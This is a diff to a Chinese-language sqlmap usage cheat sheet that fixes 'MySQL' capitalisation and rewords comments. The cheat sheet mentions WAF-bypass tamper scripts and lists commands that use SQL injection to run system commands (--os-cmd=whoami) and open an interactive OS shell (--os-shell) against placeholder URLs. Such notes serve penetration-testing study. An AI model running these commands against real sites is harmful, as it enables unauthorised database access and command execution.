@@ -39,7 +39,7 @@ tampers是sqlmap自带的绕过WAF的脚本，可查看所有tampers:
 指定数据库类型
 ```
 --dbms Oracle
---dbms Mysql
+--dbms MySQL
 --dbms "Microsoft Access"
 ```
 
@@ -79,7 +79,7 @@ id=1
 
 #### 常用参数 - 用*标记注入点
 
-针对情况：伪静态 等不识别的格式
+针对情况：伪静态 等sqlmap不能自动识别的格式
 
 ```
 sqlmap -u xxx.com/index.php/Index/view/id/40*.html --dbs
@@ -95,15 +95,13 @@ sqlmap -u xxx.com/index.php/Index/view/id/40*.html --dbs
 
 
 ```
-#--os-cmd=执行系统命令
-sqlmap -u "http://url/news?id=1"--level=3 --smart --dbms "Mysql" --os-cmd=whoami 
+# 执行指定系统命令  --os-cmd=whoami
+sqlmap -u "http://url/news?id=1"--level=3 --smart --dbms "MySQL" --os-cmd=whoami 
 ```
 
-
 ```
-# 获得交互式shell
-# --os-shell
-sqlmap -u "http://url/news?id=1"--level=3 --smart --dbms "Mysql" --os-shell #交互式shell
+# 获得交互式shell  --os-shell
+sqlmap -u "http://url/news?id=1"--level=3 --smart --dbms "MySQL" --os-shell
 ```
 
 * 实现原理
